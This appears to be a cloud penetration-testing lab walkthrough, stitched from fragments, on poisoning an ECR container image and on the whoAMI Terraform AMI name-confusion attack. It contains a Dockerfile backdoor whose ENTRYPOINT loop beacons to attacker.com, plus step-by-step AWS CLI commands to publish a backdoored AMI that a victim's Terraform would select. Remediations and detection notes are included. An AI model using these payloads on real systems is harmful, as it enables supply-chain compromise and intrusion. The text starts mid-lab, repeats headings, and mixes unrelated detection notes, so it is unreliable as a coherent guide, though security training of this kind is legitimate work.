Repositories with imageTagMutability=MUTABLE and active :latest tags are prime targets. Enable tag immutability and use image digest pinning in deployment manifests.
Objective: Poison a production container image by pulling the original, injecting a reliable process-based backdoor (compatible with minimal Alpine/Node images), and preparing it for push back to the registry.
Authorized Testing Only. This lab is for authorized testing only. Never perform these actions on systems you don't have explicit written permission to test.
Prerequisites
  • Docker installed and running on attacker machine
  • ECR pull permissions (ecr:GetDownloadUrlForLayer, ecr:BatchGetImage) on the target repository
  • A listener (netcat or Metasploit handler) on your attacker machine at the callback IP and port
  • Attacker-controlled callback host reachable from the target ECS/EKS environment
  • Lab note: the target webapp image is Node.js on Alpine Linux
Cron compatibility warning: Alpine-based Docker images do NOT include a cron daemon by default — adding a cron entry in the Dockerfile will have no effect at runtime because nothing starts crond. Use a process-based persistence pattern instead (see Steps 2-3).

When the original image has no ENTRYPOINT and only uses CMD, setting a new ENTRYPOINT in a derived image will replace the CMD execution mechanism. Use the wrapper pattern in Step 3 to preserve application behavior.
3
Create a Dockerfile that injects a reliable process-based backdoor using an ENTRYPOINT wrapper. This pattern works on Alpine images that have no cron daemon, preserves the original application CMD, and beacons persistently via a background loop.
Terminal
$ cat Dockerfile
FROM 123456789012.dkr.ecr.us-east-1.amazonaws.com/webapp:latest # Process-based persistence — no cron required (Alpine has no crond by default) # The ENTRYPOINT wrapper: # 1. Starts a background beacon loop that calls back every hour # 2. Execs the original CMD, so the application runs normally # "--" separates the wrapper's argument list from "$@" (the CMD args) ENTRYPOINT ["/bin/sh", "-c", \ "while true; do curl -s http://attacker.com/$(hostname) & sleep 3600; done & exec \"$@\"", \ "--"] # CMD is inherited from the parent image: ["node", "server.js"] # exec "$@" above passes CMD args to a new process, replacing the shell # This means node server.js becomes PID 1's child — signals work correctly
Why not cron? Node.js, Python, and Go Alpine images are deliberately minimal — they ship without crond, crontabs, or /etc/cron.d. Any cron entries written to those paths will be silently ignored unless crond is separately installed and started. The ENTRYPOINT wrapper pattern above is reliable across all base images.

Detection Notes
  • CloudTrail: ecr:PutImage from an unexpected IAM principal or source IP — especially if the image tag is latest and the calling principal is not the CI/CD pipeline role

  • ECR Enhanced Scanning will flag the new layer's components (curl invocation) as potentially suspicious in some rulesets
  • Container runtime tools (Falco, Sysdig) can detect unexpected outbound network connections from containers post-deployment

Detection Notes
  • CloudTrail: API calls from a task role (arn:aws:sts::...:assumed-role/ecs-webapp-task-role/...) to services outside the application's normal operation (e.g., secretsmanager:GetSecretValue for secrets not normally accessed, iam:CreateUser) are high-fidelity signals

  • CloudTrail: task role calls originating from the ECS task's source IP but accessing resources across multiple accounts is a lateral movement indicator
  • Enable IMDSv2 (required token-based requests) — for ECS this translates to blocking direct metadata endpoint access without AWS_CONTAINER_CREDENTIALS_RELATIVE_URI token, which is set by the ECS agent

The attack is conceptually similar to ECR supply chain poisoning but targets the AMI pull path rather than the container registry.
1
Find the vulnerable Terraform configuration. The aws_ami data source uses a name filter and most_recent = true but crucially lacks the owners field — meaning it searches ALL public AMIs, including attacker-controlled ones.
Terminal
$ cat main.tf
data "aws_ami" "app" { most_recent = true filter { name = "name" values = ["my-app-*"] } # VULNERABILITY: no 'owners' field! # This searches ALL public AMIs matching the name pattern # Any AWS account can create "my-app-20260401" and win the race }
$ # Compare with secure version: $ cat <<'EOF' data "aws_ami" "app" { most_recent = true owners = ["self"] # Only matches AMIs owned by this account filter { name = "name" values = ["my-app-*"] } } EOF
data "aws_ami" "app" { most_recent = true owners = ["self"] # Only matches AMIs owned by this account filter { name = "name" values = ["my-app-*"] } }
2
Create a backdoored AMI from an attacker-controlled account. Launch an EC2 instance, install the backdoor via userdata or SSH, then create an AMI with a name that matches the target's filter pattern and is the most recent by timestamp.
Terminal
$ # In attacker's AWS account $ INSTANCE_ID=$(aws ec2 run-instances \ --image-id ami-0abcdef1234567890 \ --instance-type t3.micro \ --key-name attacker-key \ --query 'Instances[0].InstanceId' --output text) $ echo "Launched: $INSTANCE_ID"
Launched: i-0a1b2c3d4e5f6a7b8
$ # Wait for running state, then create AMI with matching name $ aws ec2 wait instance-running --instance-ids "$INSTANCE_ID" $ AMI_ID=$(aws ec2 create-image \ --instance-id "$INSTANCE_ID" \ --name "my-app-20260401" \ --description "Application server image" \ --query 'ImageId' --output text) $ echo "Created AMI: $AMI_ID"
Created AMI: ami-0deadbeef12345678
3
Make the backdoored AMI public so it appears in the victim's cross-account AMI search. The name "my-app-20260401" will match their my-app-* filter and be newer than any existing org AMIs.
Terminal
$ aws ec2 modify-image-attribute \ --image-id ami-0deadbeef12345678 \ --launch-permission "Add=[{Group=all}]"
# No output on success
$ # Verify it's public $ aws ec2 describe-image-attribute \ --image-id ami-0deadbeef12345678 \ --attribute launchPermission
{ "ImageId": "ami-0deadbeef12345678", "LaunchPermissions": [ { "Group": "all" } ] }
4
When the victim runs terraform apply, their data source selects the attacker's AMI because it is the most recent match by creation timestamp. All new instances launch with the backdoor baked in.
Terminal
$ # On victim's side — terraform plan shows attacker's AMI $ terraform plan
data.aws_ami.app: Reading... data.aws_ami.app: Read complete after 1s [id=ami-0deadbeef12345678] ^--- ATTACKER'S AMI — not the org's! Terraform will perform the following actions: # aws_instance.app will be updated in-place ~ resource "aws_instance" "app" { ~ ami = "ami-0abcdef1234567890" -> "ami-0deadbeef12345678" # (16 unchanged attributes hidden) } Plan: 0 to add, 1 to change, 0 to destroy.
5
Demonstrate the remediations — the secure Terraform pattern with owners and the AWS-native Allowed AMIs feature that prevents this class of attack at the account level.
Terminal
$ cat main_secure.tf
# SECURE: Always specify owners to restrict AMI source data "aws_ami" "app" { most_recent = true owners = ["self"] # Only AMIs owned by this account # Or: owners = ["123456789012"] for a specific trusted account # Or: owners = ["amazon"] for Amazon-provided AMIs filter { name = "name" values = ["my-app-*"] } } # ALSO: Enable AWS Allowed AMIs feature (account-level control) # Restricts which AMIs can be used in RunInstances calls within the account # aws ec2 enable-allowed-images-settings --allowed-images-settings-state audit-mode # aws ec2 replace-image-criteria-in-allowed-images-settings \ # --image-criteria "ImageProviders=amazon,self,123456789012"
Detection Notes
  • CloudTrail: ec2:RunInstances with an AMI ID not owned by your account, a trusted partner account, or Amazon — cross-reference imageOwnerId in the event against your approved AMI owner list
  • Terraform plan output: any AMI ID change that is not correlated with an explicit AMI build pipeline run should be flagged in policy-as-code scanning (Checkov, tfsec)
  • Checkov rule: CKV_AWS_8 and similar rules flag aws_ami data sources missing owners
  • AWS Config rule: approved-amis-by-id or approved-amis-by-tag can enforce that only approved AMIs are used in your account

Cleanup

Clean up all attacker-controlled resources from the separate AWS account:

Terminal — Cleanup (Attacker Account)
$ # 1. Deregister the public AMI $ aws ec2 deregister-image --image-id ami-0deadbeef12345678 $ # 2. Terminate the source instance $ aws ec2 terminate-instances --instance-ids i-0a1b2c3d4e5f6a7b8 $ # 3. Delete associated snapshots $ SNAP_ID=$(aws ec2 describe-snapshots --owner-ids self \ --query 'Snapshots[?Description==`"Created by CreateImage(i-0a1b2c3d4e5f6a7b8)""].SnapshotId' \ --output text) $ aws ec2 delete-snapshot --snapshot-id "$SNAP_ID"
Approximately 1% of AWS organizations were vulnerable to whoAMI (Datadog research, February 2025). AWS patched their own non-production systems after disclosure. Always set owners in aws_ami data sources and enable the Allowed AMIs account-level feature. See the original research at: datadog.com/blog/whoami-attack.
